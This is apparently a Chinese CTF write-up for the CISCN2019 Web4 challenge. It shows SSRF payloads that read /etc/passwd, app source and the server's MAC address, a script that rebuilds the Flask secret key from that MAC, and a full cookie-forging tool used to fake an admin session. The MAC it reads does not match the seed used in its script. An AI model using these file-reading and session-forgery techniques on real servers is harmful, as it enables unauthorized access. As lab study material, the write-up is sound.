---
title: '[CISCN2019 华东南赛区]Web4'
date: 2024-09-05 20:11:13
tags: 题解
categories: 刷题笔记
---

### [CISCN2019 华东南赛区]Web4

我们点击链接，它会弹出一个百度的页面

<!--more-->

![image-20240905201845790](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409052018916.png)

观察url，我们考虑ssrf，分别试一下`url=/etc/passwd` `url=file:///etc/passwd`
`url=local_file:etc/passwd`,发现`file:`回应了`nohack`，另外两个打开了文件。

![image-20240905201929417](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409052019533.png)

我们访问/app/app.py

![image-20240905202416653](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409052024686.png)     

发现了一串代码，我们审计代码

如果username为fuck时，才能拿到flag，username在session中，用burp抓个包，访问`/flag`

```
 import re, random, uuid, urllib 
 from flask import Flask, session, request
 
 app = Flask(__name__)
 random.seed(uuid.getnode()) 
 app.config['SECRET_KEY'] = str(random.random()*233) 
 app.debug = True 

@app.route('/') 
def index(): 
		session['username'] = 'www-data' 
		return 'Hello World! Read somethings' 

@app.route('/read') 
def read(): 
		try: 
				url = request.args.get('url') 
				m = re.findall('^file.*', url, re.IGNORECASE) 
				n = re.findall('flag', url, re.IGNORECASE) 
				if m or n: 
				return 'No Hack' 
				res = urllib.urlopen(url) 
				return res.read() 
			except Exception as ex: 
				print str(ex) 
			return 'no response' 
@app.route('/flag')
 def flag(): 
 		if session and session['username'] == 'fuck': 
 			return open('/flag.txt').read() 
 		else:
 			return 'Access denied'
 if __name__=='__main__': 
 		app.run( 
 				debug=True, 
 				host="0.0.0.0"
 				 )

```

可以看到session中加密的内容，通过.隔开的3段内容，第一段其实就是base64 encode后的内容，但去掉了填充用的等号，若decode失败，自己需要补上1-3个等号补全。中间内容为时间戳，在flask中时间戳若超过31天则视为无效。最后一段则是安全签名，将sessiondata,时间戳，和flask的secretkey通过sha1运算的结果。

![image-20240905204415816](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409052044856.png)

通过base64解码可以得到前面的内容是{“username”:{" b":“d3d3LWRhdGE=”}，其中d3d3LWRhdGE=是www-data的base64编码，从源码中也可以看出来，然后源码中可以看到Secre_Key的生成方式,其中用于生成伪随机数seed的函数uuid.getnode(),用来获取Mac地址并且将其转换为整数，那么需要我们先读取Mac地址，read?url=/sys/class/net/eth0/address,读取到mac地址为5e:29:a4:8d:4b:1f

```
 random.seed(uuid.getnode()) 
 app.config['SECRET_KEY'] = str(random.random()*233) 

```

然后可以编写脚本获得Secre_Key，需要在python2下运行因为生成的位数会不一样，得到结果为`187.158318454`

```
import random
random.seed(0x0242ac10ae6d)
print(str(random.random()*233))

```

然后便可以利用以下脚本伪造session了

```
#!/usr/bin/env python3
""" Flask Session Cookie Decoder/Encoder """
__author__ = 'Wilson Sumanang, Alexandre ZANNI'

# standard imports
import sys
import zlib
from itsdangerous import base64_decode
import ast

# Abstract Base Classes (PEP 3119)
if sys.version_info[0] < 3:  # < 3.0
    raise Exception('Must be using at least Python 3')
elif sys.version_info[0] == 3 and sys.version_info[1] < 4:  # >= 3.0 && < 3.4
    from abc import ABCMeta, abstractmethod
else:  # > 3.4
    from abc import ABC, abstractmethod

# Lib for argument parsing
import argparse

# external Imports
from flask.sessions import SecureCookieSessionInterface


class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


if sys.version_info[0] == 3 and sys.version_info[1] < 4:  # >= 3.0 && < 3.4
    class FSCM(metaclass=ABCMeta):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e

        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if (secret_key == None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e
else:  # > 3.4
    class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e

        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if (secret_key == None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e

if __name__ == "__main__":
    # Args are only relevant for __main__ usage

    ## Description for help
    parser = argparse.ArgumentParser(
        description='Flask Session Cookie Decoder/Encoder',
        epilog="Author : Wilson Sumanang, Alexandre ZANNI")

    ## prepare sub commands
    subparsers = parser.add_subparsers(help='sub-command help', dest='subcommand')

    ## create the parser for the encode command
    parser_encode = subparsers.add_parser('encode', help='encode')
    parser_encode.add_argument('-s', '--secret-key', metavar='<string>',
                               help='Secret key', required=True)
    parser_encode.add_argument('-t', '--cookie-structure', metavar='<string>',
                               help='Session cookie structure', required=True)

    ## create the parser for the decode command
    parser_decode = subparsers.add_parser('decode', help='decode')
    parser_decode.add_argument('-s', '--secret-key', metavar='<string>',
                               help='Secret key', required=False)
    parser_decode.add_argument('-c', '--cookie-value', metavar='<string>',
                               help='Session cookie value', required=True)

    ## get args
    args = parser.parse_args()

    ## find the option chosen
    if (args.subcommand == 'encode'):
        if (args.secret_key is not None and args.cookie_structure is not None):
            print(FSCM.encode(args.secret_key, args.cookie_structure))
    elif (args.subcommand == 'decode'):
        if (args.secret_key is not None and args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value, args.secret_key))
        elif (args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value))


```

eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.ZtmrCw.bLaAGZHj-EsZu-pT8YmMKRb7Ils

![image-20240905205509346](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409052055451.png)

然后伪造session

提交，访问/flag得到flag

![image-20240905210033418](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409052100468.png)

